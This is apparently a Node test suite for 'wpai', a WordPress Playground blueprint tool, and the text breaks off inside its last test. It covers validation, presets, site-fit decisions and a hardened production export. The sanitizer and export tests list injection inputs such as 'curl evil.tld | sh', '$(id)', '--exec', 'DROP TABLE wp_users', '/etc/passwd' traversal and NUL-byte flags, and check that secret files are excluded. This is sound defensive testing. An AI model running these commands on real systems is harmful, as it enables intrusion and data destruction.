import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';
import {
  deriveFallbackVerifySpec,
  evaluateFit,
  exportForProduction,
  findVerifyProbePhpPath,
  handleMcpRequest,
  initProject,
  loadPreset,
  loadRegistry,
  PRESET_NAMES,
  sanitizeWpCliCommand,
  scanSecretTokens,
  validateBlueprintFile,
  validateBlueprintObject,
  validateRegistry,
} from '../src/index.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const cliEntry = path.resolve(__dirname, '../../dist/cli.js');

function runCli(
  args: string[],
  options: { cwd?: string } = {}
): { code: number; stdout: string; stderr: string } {
  const res = spawnSync(process.execPath, [cliEntry, ...args], {
    cwd: options.cwd,
    encoding: 'utf8',
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  return {
    code: res.status ?? 1,
    stdout: res.stdout ?? '',
    stderr: res.stderr ?? '',
  };
}

describe('wpai validate-registry', () => {
  it('validates registry/wp-capabilities.json against Draft 2020-12 schema', () => {
    const result = validateRegistry();
    assert.equal(result.valid, true, JSON.stringify(result.errors, null, 2));
    assert.equal(result.errors.length, 0);
  });

  it('exits 0 via CLI for valid registry and 1 for invalid registry', () => {
    const okRes = runCli(['validate-registry', '--json']);
    assert.equal(okRes.code, 0, okRes.stderr);
    const parsedOk = JSON.parse(okRes.stdout) as { valid: boolean };
    assert.equal(parsedOk.valid, true);

    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wpai-bad-reg-'));
    try {
      const badPath = path.join(tmpDir, 'bad-registry.json');
      fs.writeFileSync(badPath, JSON.stringify({ registry_version: 'not-semver' }), 'utf8');
      const badRes = runCli(['validate-registry', badPath, '--json']);
      assert.equal(badRes.code, 1);
      const parsedBad = JSON.parse(badRes.stdout) as { valid: boolean; errors: unknown[] };
      assert.equal(parsedBad.valid, false);
      assert.ok(parsedBad.errors.length > 0);
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });
});

describe('wpai validate (Blueprint v1 validator)', () => {
  it('accepts a valid Blueprint v1 document', () => {
    const validBp = {
      $schema: 'https://playground.wordpress.net/blueprint-schema.json',
      landingPage: '/',
      preferredVersions: { php: '8.3', wp: 'latest' },
      features: { networking: true, intl: true },
      login: true,
      steps: [
        { step: 'setSiteOptions', options: { blogname: 'Test Site' } },
        {
          step: 'runPHP',
          code: "<?php require_once '/wordpress/wp-load.php'; update_option('blogname', 'Updated');",
        },
        { step: 'wp-cli', command: 'wp option get blogname' },
      ],
    };

    const res = validateBlueprintObject(validBp);
    assert.equal(res.valid, true, JSON.stringify(res.errors, null, 2));
    assert.equal(res.errors.length, 0);
    assert.equal(res.warnings.length, 0);
  });

  it('rejects deprecated pluginZipFile and themeZipFile', () => {
    const res = validateBlueprintObject({
      $schema: 'https://playground.wordpress.net/blueprint-schema.json',
      steps: [
        {
          step: 'installPlugin',
          pluginZipFile: { resource: 'wordpress.org/plugins', slug: 'akismet' },
        },
        {
          step: 'installTheme',
          themeZipFile: { resource: 'wordpress.org/themes', slug: 'twentytwentyfive' },
        },
      ],
    });
    assert.equal(res.valid, false);
    const codes = res.errors.map((e) => e.code);
    assert.ok(codes.includes('DEPRECATED_PLUGIN_ZIP_FILE'));
    assert.ok(codes.includes('DEPRECATED_THEME_ZIP_FILE'));
  });

  it('rejects wrong step name "cli" (must be "wp-cli")', () => {
    const res = validateBlueprintObject({
      $schema: 'https://playground.wordpress.net/blueprint-schema.json',
      steps: [{ step: 'cli', command: 'wp post list' }],
    });
    assert.equal(res.valid, false);
    assert.ok(res.errors.some((e) => e.code === 'INVALID_CLI_STEP_NAME'));
  });

  it('rejects unknown top-level keys', () => {
    const res = validateBlueprintObject({
      $schema: 'https://playground.wordpress.net/blueprint-schema.json',
      siteTitle: 'Not Allowed Top Level',
      steps: [],
    });
    assert.equal(res.valid, false);
    assert.ok(res.errors.some((e) => e.code === 'UNKNOWN_TOP_LEVEL_KEY'));
  });

  it('rejects patch-level PHP version in preferredVersions.php', () => {
    const res = validateBlueprintObject({
      $schema: 'https://playground.wordpress.net/blueprint-schema.json',
      preferredVersions: { php: '8.3.6', wp: 'latest' },
      steps: [],
    });
    assert.equal(res.valid, false);
    assert.ok(res.errors.some((e) => e.code === 'INVALID_PHP_VERSION'));
  });

  it('rejects disallowed features keys', () => {
    const res = validateBlueprintObject({
      $schema: 'https://playground.wordpress.net/blueprint-schema.json',
      features: { networking: true, redis: true },
      steps: [],
    });
    assert.equal(res.valid, false);
    assert.ok(res.errors.some((e) => e.code === 'UNKNOWN_FEATURE_KEY'));
  });

  it('rejects meta object missing required author or title', () => {
    const res = validateBlueprintObject({
      $schema: 'https://playground.wordpress.net/blueprint-schema.json',
      meta: { title: 'Only Title' },
      steps: [],
    });
    assert.equal(res.valid, false);
    assert.ok(res.errors.some((e) => e.code === 'MISSING_META_AUTHOR'));
  });

  it('warns when runPHP calls WordPress functions without wp-load.php', () => {
    const res = validateBlueprintObject({
      $schema: 'https://playground.wordpress.net/blueprint-schema.json',
      steps: [
        {
          step: 'runPHP',
          code: "<?php wp_insert_post(array('post_title' => 'Hello'));",
        },
      ],
    });
    assert.equal(res.valid, true);
    assert.ok(res.warnings.some((w) => w.code === 'RUN_PHP_MISSING_WP_LOAD'));
  });

  it('returns exit 1 via CLI on invalid JSON file', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wpai-val-'));
    try {
      const badJson = path.join(tmpDir, 'blueprint.json');
      fs.writeFileSync(badJson, '{ invalid json', 'utf8');
      const res = runCli(['validate', badJson, '--json']);
      assert.equal(res.code, 1);
      const parsed = JSON.parse(res.stdout) as { valid: boolean; errors: Array<{ code: string }> };
      assert.equal(parsed.valid, false);
      assert.equal(parsed.errors[0]?.code, 'INVALID_JSON');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });
});

describe('wpai init (all 6 presets)', () => {
  it('loads every preset directly from canonical blueprints/<preset>/ with zero drift', () => {
    const repoRoot = path.resolve(__dirname, '../../../..');
    for (const preset of PRESET_NAMES) {
      const tpl = loadPreset(preset);
      const canonicalBp = JSON.parse(
        fs.readFileSync(path.join(repoRoot, 'blueprints', preset, 'blueprint.json'), 'utf8')
      );
      const canonicalVerify = JSON.parse(
        fs.readFileSync(path.join(repoRoot, 'blueprints', preset, 'verify.json'), 'utf8')
      );
      assert.deepEqual(tpl.blueprint, canonicalBp, `${preset} blueprint must match canonical file`);
      assert.deepEqual(tpl.verify, canonicalVerify, `${preset} verify.json must match canonical file`);
    }
  });

  for (const preset of PRESET_NAMES) {
    it(`scaffolds "${preset}" into a fresh temp directory with valid blueprint & custom options`, () => {
      const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), `wpai-init-${preset}-`));
      try {
        const customName = `Custom ${preset} Site`;
        const res = initProject({
          preset,
          dir: tmpDir,
          name: customName,
          wp: 'latest',
          php: '8.3',
        });

        assert.equal(res.preset, preset);
        assert.equal(res.name, customName);

        for (const requiredFile of ['blueprint.json', 'verify.json', 'package.json', 'README.md']) {
          assert.ok(
            fs.existsSync(path.join(tmpDir, requiredFile)),
            `Expected ${requiredFile} to exist for preset ${preset}`
          );
        }

        const bpPath = path.join(tmpDir, 'blueprint.json');
        const val = validateBlueprintFile(bpPath);
        assert.equal(val.valid, true, JSON.stringify(val.errors, null, 2));
        assert.equal(val.warnings.length, 0, JSON.stringify(val.warnings, null, 2));

        const bpJson = JSON.parse(fs.readFileSync(bpPath, 'utf8')) as {
          preferredVersions: { php: string; wp: string };
          steps: Array<{ step: string; options?: Record<string, unknown> }>;
        };
        assert.equal(bpJson.preferredVersions.php, '8.3');
        assert.equal(bpJson.preferredVersions.wp, 'latest');

        const setOpts = bpJson.steps.find((s) => s.step === 'setSiteOptions');
        assert.equal(setOpts?.options?.blogname, customName);

        const verifyJson = JSON.parse(
          fs.readFileSync(path.join(tmpDir, 'verify.json'), 'utf8')
        ) as { expected_blogname?: string };
        assert.equal(verifyJson.expected_blogname, customName);

        const pkgJson = JSON.parse(
          fs.readFileSync(path.join(tmpDir, 'package.json'), 'utf8')
        ) as { scripts: Record<string, string> };
        assert.ok(pkgJson.scripts.start?.includes('@wp-playground/cli'));
        assert.ok(pkgJson.scripts.verify?.includes('wpai verify'));

        const readme = fs.readFileSync(path.join(tmpDir, 'README.md'), 'utf8');
        assert.match(readme, /npm start/);
        assert.match(readme, /wpai verify \./);
        assert.doesNotMatch(readme, new RegExp(`blueprints/${preset}/`));
      } finally {
        fs.rmSync(tmpDir, { recursive: true, force: true });
      }
    });
  }

  it('derives fallback expected_blogname strictly from configured blogname, never meta.title or preset name', () => {
    assert.deepEqual(
      deriveFallbackVerifySpec({ meta: { title: 'Gallery Title Only' }, steps: [] }),
      {}
    );
    assert.deepEqual(
      deriveFallbackVerifySpec({ siteOptions: { blogname: 'Top Level Name' } }),
      { expected_blogname: 'Top Level Name' }
    );
    assert.deepEqual(
      deriveFallbackVerifySpec({
        meta: { title: 'Gallery Title' },
        steps: [{ step: 'setSiteOptions', options: { blogname: 'Step Name' } }],
      }),
      { expected_blogname: 'Step Name' }
    );
  });

  it('preserves an existing destination README.md when scaffolding', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wpai-keep-readme-'));
    try {
      const existing = '# My Existing Project\n\nCustom notes that must not be overwritten.\n';
      fs.writeFileSync(path.join(tmpDir, 'README.md'), existing, 'utf8');
      const res = initProject({ preset: 'small-business', dir: tmpDir, name: 'Corner Bakery' });
      assert.equal(fs.readFileSync(path.join(tmpDir, 'README.md'), 'utf8'), existing);
      assert.ok(!res.files_written.includes('README.md'));
      assert.equal(res.source, 'built-in');
      assert.equal(res.asset_source, 'bundled-assets');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it('works from an arbitrary directory outside the repository via CLI', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wpai-outside-'));
    try {
      const res = runCli(
        ['init', 'small-business', '--dir', tmpDir, '--name', 'Corner Bakery', '--json'],
        { cwd: os.tmpdir() }
      );
      assert.equal(res.code, 0, res.stderr);
      const parsed = JSON.parse(res.stdout) as {
        ok: boolean;
        preset: string;
        name: string;
        source: string;
        asset_source: string;
      };
      assert.equal(parsed.ok, true);
      assert.equal(parsed.preset, 'small-business');
      assert.equal(parsed.name, 'Corner Bakery');
      assert.equal(parsed.source, 'built-in');
      assert.equal(parsed.asset_source, 'bundled-assets');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });
});

describe('wpai check-fit & catalog', () => {
  const { registry } = loadRegistry();

  it('recommends WordPress for suitable prompts with matching presets', () => {
    const cases: Array<{ prompt: string; expectedDecision: string; expectedPreset: string }> = [
      { prompt: 'website for my bakery', expectedDecision: 'recommended', expectedPreset: 'small-business' },
      {
        prompt: 'Client runs a yoga studio. Needs class times and a contact form, and she wants to post updates herself.',
        expectedDecision: 'recommended',
        expectedPreset: 'small-business',
      },
      { prompt: 'I want to sell my candles online', expectedDecision: 'recommended', expectedPreset: 'commerce' },
      {
        prompt: 'Client sells bike parts, a couple hundred products. Needs stock levels and shipping by weight.',
        expectedDecision: 'recommended',
        expectedPreset: 'commerce',
      },
      {
        prompt: "I've been writing up my hikes in my notes app for years. I'd like a proper blog on my own domain.",
        expectedDecision: 'recommended',
        expectedPreset: 'publishing',
      },
      {
        prompt: "We want a local news site for our town. There's 4 or 5 of us writing, so it needs categories and author pages.",
        expectedDecision: 'recommended',
        expectedPreset: 'publishing',
      },
      {
        prompt: 'I volunteer at a dog rescue and we only have a Facebook page. We want to show the dogs up for adoption and take donations.',
        expectedDecision: 'recommended',
        expectedPreset: 'small-business',
      },
      {
        prompt: "this is our cafe's website, my nephew made it. the menu is from last year and I can't work out how to change it",
        expectedDecision: 'recommended',
        expectedPreset: 'small-business',
      },
      {
        prompt: 'Make a site where I can sell my pottery course',
        expectedDecision: 'contested',
        expectedPreset: 'commerce',
      },
    ];

    for (const tc of cases) {
      const fit = evaluateFit(tc.prompt, registry);
      assert.equal(
        fit.decision,
        tc.expectedDecision,
        `Prompt "${tc.prompt}" expected ${tc.expectedDecision}, got ${fit.decision}`
      );
      assert.equal(fit.wordpress_fit, true);
      assert.equal(fit.blueprint_preset, tc.expectedPreset);
      assert.ok(fit.matched_signals.length > 0);
    }
  });

  it('rejects WordPress on negative controls (app-3, docs-1, page-2)', () => {
    const controls = [
      { id: 'app-3', prompt: 'small invoicing SaaS, auth, postgres, stripe billing', expectedDomain: 'web-app-saas' },
      { id: 'docs-1', prompt: 'docs site for our CLI', expectedDomain: 'developer-docs' },
      { id: 'page-2', prompt: 'I need a page with links to all my socials', expectedDomain: 'single-static-page' },
    ];

    for (const c of controls) {
      const fit = evaluateFit(c.prompt, registry);
      assert.equal(fit.decision, 'not_recommended', `Control ${c.id} should be not_recommended`);
      assert.equal(fit.wordpress_fit, false);
      assert.equal(fit.domain_id, c.expectedDomain);
      assert.equal(fit.blueprint_preset, null);
      assert.ok((fit.preferred_alternatives?.length ?? 0) > 0);
    }
  });

  it('returns needs_clarification for ambiguous requests', () => {
    const fit = evaluateFit('help me build something cool next week', registry);
    assert.equal(fit.decision, 'needs_clarification');
    assert.equal(fit.wordpress_fit, null);
  });

  it('outputs valid JSON from wpai catalog --json and wpai check-fit --json', () => {
    const cat = runCli(['catalog', '--json']);
    assert.equal(cat.code, 0, cat.stderr);
    const parsedCat = JSON.parse(cat.stdout) as { registry_version: string };
    assert.ok(parsedCat.registry_version);

    const fit = runCli(['check-fit', 'docs site for our CLI', '--json']);
    assert.equal(fit.code, 0, fit.stderr);
    const parsedFit = JSON.parse(fit.stdout) as { decision: string; wordpress_fit: boolean };
    assert.equal(parsedFit.decision, 'not_recommended');
    assert.equal(parsedFit.wordpress_fit, false);
  });
});

describe('wpai export (production handoff bridge)', () => {
  function tmp(prefix: string): string {
    return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  }

  function writeBlueprint(dir: string, bp: Record<string, unknown>): void {
    fs.writeFileSync(
      path.join(dir, 'blueprint.json'),
      JSON.stringify({ $schema: 'https://playground.wordpress.net/blueprint-schema.json', ...bp }, null, 2)
    );
  }

  it('fails safe by default on a preset with runPHP: ok false, nothing written, runPHP reported', () => {
    const srcDir = tmp('wpai-exp-src-');
    const outRoot = tmp('wpai-exp-out-');
    const outDir = path.join(outRoot, 'bundle');
    try {
      initProject({ preset: 'nonprofit', dir: srcDir, name: 'Harbor Rescue' });
      const res = exportForProduction({ target: srcDir, outDir });
      assert.equal(res.ok, false);
      assert.equal(res.complete, false);
      assert.deepEqual(res.files_written, []);
      assert.equal(fs.existsSync(outDir), false, 'no bundle directory should be created');
      const runPhp = res.skipped_steps.find((s) => s.step === 'runPHP');
      assert.ok(runPhp, 'runPHP step must be reported');
      assert.equal(runPhp.blocking, true);
      assert.match(runPhp.location, /^steps\[\d+\]$/);
      // Playground-only operations are reported but do not block; wp-content mkdir is exported, not skipped
      assert.ok(res.skipped_steps.some((s) => s.step === 'login' && !s.blocking));
      assert.ok(!res.skipped_steps.some((s) => s.step === 'mkdir'));
    } finally {
      fs.rmSync(srcDir, { recursive: true, force: true });
      fs.rmSync(outRoot, { recursive: true, force: true });
    }
  });

  it('writes an incomplete bundle marked as such with allowPartial', () => {
    const srcDir = tmp('wpai-exp-src-');
    const outDir = tmp('wpai-exp-out-');
    try {
      initProject({ preset: 'nonprofit', dir: srcDir, name: 'Harbor Rescue' });
      const res = exportForProduction({ target: srcDir, outDir, allowPartial: true });
      assert.equal(res.ok, true);
      assert.equal(res.complete, false);
      assert.ok(res.wp_content_files.some((f) => f.endsWith('wpai-nonprofit.php')));
      assert.ok(res.wp_cli_commands.some((c) => c.includes('blogname') && c.includes('Harbor Rescue')));
      assert.ok(fs.existsSync(path.join(outDir, 'blueprint.json')));
      const deployMd = fs.readFileSync(path.join(outDir, 'DEPLOY.md'), 'utf8');
      assert.match(deployMd, /Incomplete export/);
      assert.match(deployMd, /## Manual Steps Required[\s\S]*runPHP/);
      assert.match(deployMd, /## Not Exported \(Playground-Only/);
      const setupSh = fs.readFileSync(path.join(outDir, 'setup.sh'), 'utf8');
      assert.match(setupSh, /INCOMPLETE EXPORT/);
      assert.doesNotMatch(setupSh, /provisioning complete/);
    } finally {
      fs.rmSync(srcDir, { recursive: true, force: true });
      fs.rmSync(outDir, { recursive: true, force: true });
    }
  });

  it('reports a complete export when every operation translates', () => {
    const srcDir = tmp('wpai-exp-src-');
    const outDir = tmp('wpai-exp-out-');
    try {
      writeBlueprint(srcDir, {
        login: true,
        steps: [
          { step: 'setSiteOptions', options: { blogname: 'Plain Site' } },
          { step: 'mkdir', path: '/wordpress/wp-content/mu-plugins' },
          { step: 'writeFile', path: '/wordpress/wp-content/mu-plugins/hello.php', data: '<?php // hi' },
          { step: 'mkdir', path: '/wordpress/wp-content/uploads/private' },
          { step: 'installPlugin', pluginData: { resource: 'wordpress.org/plugins', slug: 'akismet' } },
        ],
      });
      const res = exportForProduction({ target: srcDir, outDir });
      assert.equal(res.ok, true);
      assert.equal(res.complete, true);
      assert.ok(
        fs.statSync(path.join(outDir, 'wp-content', 'uploads', 'private')).isDirectory(),
        'an empty mkdir under wp-content/ must be recreated in the bundle'
      );
      assert.ok(res.skipped_steps.every((s) => !s.blocking));
      assert.deepEqual(res.wp_content_files, [path.join('wp-content', 'mu-plugins', 'hello.php')]);
      const deployMd = fs.readFileSync(path.join(outDir, 'DEPLOY.md'), 'utf8');
      assert.doesNotMatch(deployMd, /Manual Steps Required/);
      assert.match(fs.readFileSync(path.join(outDir, 'setup.sh'), 'utf8'), /provisioning complete/);
    } finally {
      fs.rmSync(srcDir, { recursive: true, force: true });
      fs.rmSync(outDir, { recursive: true, force: true });
    }
  });

  it('serializes structured option values with --format=json in both siteOptions and setSiteOptions', () => {
    const srcDir = tmp('wpai-exp-src-');
    const outDir = tmp('wpai-exp-out-');
    try {
      writeBlueprint(srcDir, {
        siteOptions: {
          blogname: 'Plain Site',
          top_level_cfg: { enabled: true, retries: 3 },
        },
        steps: [
          {
            step: 'setSiteOptions',
            options: {
              my_plugin_settings: { enabled: true, tags: ['a', 'b'] },
              feature_flag: false,
            },
          },
        ],
      });
      const res = exportForProduction({ target: srcDir, outDir });
      assert.equal(res.ok, true);
      assert.equal(res.complete, true);
      assert.ok(
        res.wp_cli_commands.includes("wp option update 'blogname' 'Plain Site'"),
        'scalar string options stay plaintext'
      );
      assert.ok(
        res.wp_cli_commands.includes(
          `wp option update 'top_level_cfg' '{"enabled":true,"retries":3}' --format=json`
        ),
        'top-level structured siteOptions must use --format=json'
      );
      assert.ok(
        res.wp_cli_commands.includes(
          `wp option update 'my_plugin_settings' '{"enabled":true,"tags":["a","b"]}' --format=json`
        ),
        'setSiteOptions structured values must use --format=json'
      );
      assert.ok(
        res.wp_cli_commands.includes("wp option update 'feature_flag' 'false' --format=json"),
        'boolean option values must use --format=json'
      );
      assert.ok(!res.wp_cli_commands.some((c) => c.includes('[object Object]')));
    } finally {
      fs.rmSync(srcDir, { recursive: true, force: true });
      fs.rmSync(outDir, { recursive: true, force: true });
    }
  });

  it('flags untranslatable writeFile, plugin/theme sources, constants, and unknown steps as blocking', () => {
    const srcDir = tmp('wpai-exp-src-');
    const outDir = tmp('wpai-exp-out-');
    try {
      writeBlueprint(srcDir, {
        constants: { WP_DEBUG: true },
        steps: [
          { step: 'writeFile', path: '/wordpress/wp-config-extra.php', data: '<?php' },
          {
            step: 'writeFile',
            path: '/wordpress/wp-content/uploads/logo.png',
            data: { resource: 'url', url: 'https://example.com/logo.png' },
          },
          { step: 'installPlugin', pluginData: { resource: 'url', url: 'https://example.com/p.zip' } },
          { step: 'installTheme', themeData: { resource: 'url', url: 'https://example.com/t.zip' } },
          { step: 'importWxr', file: { resource: 'url', url: 'https://example.com/content.xml' } },
          { step: 'mkdir', path: '/wordpress/wp-content/../../etc' },
          { step: 'installPlugin', pluginData: { resource: 'wordpress.org/plugins', slug: '  ' } },
          { step: 'installTheme', themeData: { resource: 'wordpress.org/themes', slug: '' } },
        ],
      });
      const res = exportForProduction({ target: srcDir, outDir });
      assert.equal(res.ok, false);
      const blocking = res.skipped_steps.filter((s) => s.blocking).map((s) => s.location);
      assert.deepEqual(blocking, [
        'constants',
        'steps[0]',
        'steps[1]',
        'steps[2]',
        'steps[3]',
        'steps[4]',
        'steps[5]',
        'steps[6]',
        'steps[7]',
      ]);
      assert.ok(!res.wp_cli_commands.some((c) => c.includes("install ''")));
    } finally {
      fs.rmSync(srcDir, { recursive: true, force: true });
      fs.rmSync(outDir, { recursive: true, force: true });
    }
  });

  it('T1: re-quotes allowlisted wp-cli steps and blocks injection, global flags, and unlisted subcommands', () => {
    const ok = [
      ['wp option update blogname "Tom & Jerry; rm -rf /"', `wp option update 'blogname' 'Tom & Jerry; rm -rf /'`],
      ['wp plugin install akismet --activate', `wp plugin install 'akismet' --activate`],
      ["wp post create --post_type=page --post_title='About $us'", `wp post create --post_type='page' --post_title='About $us'`],
      ['wp rewrite structure /%postname%/', `wp rewrite structure '/%postname%/'`],
    ];
    for (const [input, expected] of ok) {
      const res = sanitizeWpCliCommand(input!);
      assert.ok(res.ok, `${input} should be allowed: ${res.ok ? '' : res.reason}`);
      assert.equal(res.value, expected);
    }
    const blocked: Array<[string, RegExp]> = [
      ['wp option update x y; curl evil.tld | sh', /metacharacter ";"/],
      ['wp option update x $(id)', /metacharacter "\$"/],
      ['wp option update x `id`', /metacharacter "`"/],
      ['wp option update x y\nwp eval "1"', /multiple lines/],
      ['wp option get blogname --exec="system(1);"', /--exec is blocked/],
      ['wp plugin list --require=/tmp/x.php', /--require is blocked/],
      ['wp option get blogname --ssh=user@host', /--ssh is blocked/],
      ['wp eval "echo 1;"', /not on the export allowlist/],
      ['wp db query "DROP TABLE wp_users"', /not on the export allowlist/],
      ['wp plugin install https://evil.tld/p.zip --activate', /not a WordPress.org slug/],
      ['wp plugin install ./local.zip', /not a WordPress.org slug/],
      ['wp option update siteurl https://evil.tld', /security-sensitive/],
      ['wp option update default_role administrator', /security-sensitive/],
      ['wp user create bob b@x.tld --role=administrator', /not on the export allowlist/],
      ['curl https://evil.tld', /must start with "wp"/],
      ['wp theme install twentytwentyfive -f', /Short flag/],
      ["wp option update x 'unterminated", /unterminated quote/],
    ];
    for (const [input, reason] of blocked) {
      const res = sanitizeWpCliCommand(input);
      assert.equal(res.ok, false, `${input} should be blocked`);
      assert.match(res.ok ? '' : res.reason, reason, input);
    }

    const srcDir = tmp('wpai-exp-src-');
    const outDir = tmp('wpai-exp-out-');
    try {
      writeBlueprint(srcDir, {
        steps: [
          { step: 'wp-cli', command: 'wp option update blogname "Safe Site"' },
          { step: 'wp-cli', command: 'wp option update x y; curl evil.tld | sh' },
        ],
      });
      const res = exportForProduction({ target: srcDir, outDir, allowPartial: true });
      assert.deepEqual(res.wp_cli_commands, [`wp option update 'blogname' 'Safe Site'`]);
      assert.deepEqual(
        res.skipped_steps.filter((s) => s.blocking).map((s) => s.location),
        ['steps[1]']
      );
      assert.doesNotMatch(fs.readFileSync(path.join(outDir, 'setup.sh'), 'utf8'), /evil\.tld/);
    } finally {
      fs.rmSync(srcDir, { recursive: true, force: true });
      fs.rmSync(outDir, { recursive: true, force: true });
    }
  });

  it('T4: validates plugin/theme slugs, option names, leading-dash and NUL-byte values; preserves exact activatePlugin file identifiers', () => {
    const srcDir = tmp('wpai-exp-src-');
    const outDir = tmp('wpai-exp-out-');
    try {
      writeBlueprint(srcDir, {
        plugins: ['--allow-root', 'jetpack'],
        siteOptions: { '--exec': 'x', blogname: '--exec=phpinfo();', nul_flag: '\0--exec=phpinfo();', home: 'http://127.0.0.1' },
        steps: [
          { step: 'installPlugin', pluginData: { resource: 'wordpress.org/plugins', slug: 'Bad Slug' } },
          { step: 'installTheme', themeData: { resource: 'wordpress.org/themes', slug: '--force' } },
          { step: 'activateTheme', themeFolderName: '../../etc' },
          { step: 'activatePlugin', pluginPath: '/wordpress/wp-content/plugins/hello-dolly/hello.php' },
          { step: 'activatePlugin', pluginPath: 'custom/addon.php' },
          { step: 'activatePlugin', pluginPath: 'hello.php' },
          { step: 'activatePlugin', pluginPath: 'akismet' },
          { step: 'activatePlugin', pluginPath: '/etc/passwd' },
        ],
      });
      const res = exportForProduction({ target: srcDir, outDir });
      assert.equal(res.ok, false);
      assert.deepEqual(res.wp_cli_commands, [
        `wp plugin install 'jetpack' --activate`,
        `wp plugin activate 'hello-dolly/hello.php'`,
        `wp plugin activate 'custom/addon.php'`,
        `wp plugin activate 'hello.php'`,
        `wp plugin activate 'akismet'`,
      ]);
      const blocking = res.skipped_steps.filter((s) => s.blocking).map((s) => s.location);
      assert.deepEqual(blocking, [
        'siteOptions',
        'siteOptions',
        'siteOptions',
        'siteOptions',
        'plugins[0]',
        'steps[0]',
        'steps[1]',
        'steps[2]',
        'steps[7]',
      ]);
    } finally {
      fs.rmSync(srcDir, { recursive: true, force: true });
      fs.rmSync(outDir, { recursive: true, force: true });
    }
  });

  it('T3/T5: never follows symlinks (including dangling), excludes *.env* / *.sqlite* variants, redacts sensitive writeFile data, and cleans reused outDir', () => {
    const srcDir = tmp('wpai-exp-src-');
    const danglingDir = tmp('wpai-exp-dangling-');
    const secretDir = tmp('wpai-exp-secret-');
    const outDir = tmp('wpai-exp-out-');
    try {
      writeBlueprint(srcDir, {
        steps: [
          { step: 'setSiteOptions', options: { blogname: 'Linked' } },
          { step: 'writeFile', path: '/wordpress/wp-content/uploads/.htaccess', data: 'Allow from all' },
          { step: 'writeFile', path: '/wordpress/wp-content/uploads/shop.env.production', data: 'API_KEY=1' },
          { step: 'writeFile', path: '/wordpress/wp-content/uploads/backup.sqlite.gz', data: 'DB' },
          { step: 'writeFile', path: '/wordpress/wp-content/./mu-plugins//ok.php', data: '<?php' },
        ],
      });
      fs.writeFileSync(path.join(secretDir, 'id_rsa'), 'PRIVATE KEY');
      const wpContent = path.join(srcDir, 'wp-content');
      fs.mkdirSync(path.join(wpContent, 'themes', 'mine'), { recursive: true });
      fs.writeFileSync(path.join(wpContent, 'themes', 'mine', 'style.css'), '/* Theme Name: Mine */');
      fs.writeFileSync(path.join(wpContent, 'wp-config-local.php'), '<?php define("DB_PASSWORD","x");');
      fs.writeFileSync(path.join(wpContent, '.env'), 'SECRET=1');
      fs.writeFileSync(path.join(wpContent, '.env-production'), 'SECRET=2');
      fs.writeFileSync(path.join(wpContent, 'shop.env.production'), 'SECRET=3');
      fs.writeFileSync(path.join(wpContent, 'backup.sql'), 'INSERT');
      fs.writeFileSync(path.join(wpContent, 'backup.sqlite.gz'), 'SQLITE_GZ');
      fs.writeFileSync(path.join(wpContent, 'database.sqlite.bak'), 'SQLITE_BAK');
      fs.writeFileSync(path.join(wpContent, 'debug.log'), 'trace');
      fs.symlinkSync(secretDir, path.join(wpContent, 'plugins'));
      fs.symlinkSync(path.join(secretDir, 'id_rsa'), path.join(wpContent, 'themes', 'mine', 'key.txt'));

      // Dangling root wp-content symlink must still be caught and fail safe
      writeBlueprint(danglingDir, { steps: [{ step: 'setSiteOptions', options: { blogname: 'Dangling' } }] });
      fs.symlinkSync(path.join(danglingDir, 'does-not-exist'), path.join(danglingDir, 'wp-content'));
      const danglingRes = exportForProduction({ target: danglingDir, outDir: path.join(outDir, 'dangling') });
      assert.equal(danglingRes.ok, false, 'dangling wp-content symlink must fail safe');
      assert.ok(danglingRes.skipped_steps.some((s) => s.location === 'wp-content' && s.blocking));

      const strict = exportForProduction({ target: srcDir, outDir: path.join(outDir, 'strict') });
      assert.equal(strict.ok, false, 'symlinks are blocking so nothing is silently missing');
      assert.equal(fs.existsSync(path.join(outDir, 'strict')), false);

      // Pre-populate outDir with a stale excluded file to ensure reused outDir cannot retain it
      fs.mkdirSync(path.join(outDir, 'wp-content'), { recursive: true });
      fs.writeFileSync(path.join(outDir, 'wp-content', 'stale.env.production'), 'LEAK=1');

      const res = exportForProduction({ target: srcDir, outDir, allowPartial: true });
      assert.deepEqual(res.wp_content_files, [
        path.join('wp-content', 'mu-plugins', 'ok.php'),
        path.join('wp-content', 'themes', 'mine', 'style.css'),
      ]);
      const byLocation = new Map(res.skipped_steps.map((s) => [s.location, s]));
      assert.equal(byLocation.get('wp-content/plugins')?.blocking, true);
      assert.equal(byLocation.get('wp-content/themes/mine/key.txt')?.blocking, true);
      assert.equal(byLocation.get('steps[1]')?.blocking, true, '.htaccess writeFile is refused');
      assert.equal(byLocation.get('steps[2]')?.blocking, true, 'shop.env.production writeFile is refused');
      assert.equal(byLocation.get('steps[3]')?.blocking, true, 'backup.sqlite.gz writeFile is refused');
      for (const f of [
        'wp-config-local.php',
        '.env',
        '.env-production',
        'shop.env.production',
        'backup.sql',
        'backup.sqlite.gz',
        'database.sqlite.bak',
        'debug.log',
      ]) {
        assert.equal(byLocation.get(`wp-content/${f}`)?.blocking, false, `${f} excluded without blocking`);
      }
      assert.equal(fs.existsSync(path.join(outDir, 'wp-content', 'plugins')), false);
      const bundled = fs.readdirSync(outDir, { recursive: true }).map(String);
      assert.ok(
        !bundled.some((f) => /id_rsa|key\.txt|wp-config|\.env|\.sql|\.sqlite|debug\.log|\.htaccess|stale/.test(f)),
        bundled.join(',')
      );
      const exportedBpText = fs.readFileSync(path.join(outDir, 'blueprint.json'), 'utf8');
      assert.doesNotMatch(exportedBpText, /API_KEY=1|Allow from all/, 'sensitive writeFile payloads must be redacted in bundled blueprint.json');
      assert.match(exportedBpText, /REDACTED by wpai export/);
    } finally {
